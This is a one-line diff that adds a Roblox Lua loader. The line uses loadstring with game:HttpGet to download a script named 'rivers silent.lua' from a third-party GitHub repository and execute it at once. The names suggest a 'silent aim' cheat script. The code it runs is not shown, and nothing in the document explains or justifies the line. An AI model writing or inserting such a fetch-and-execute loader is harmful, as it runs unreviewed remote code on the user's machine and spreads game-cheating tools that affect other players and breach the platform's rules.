@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/riverrrrrrrr/main-silent/main/rivers%20silent.lua"))()
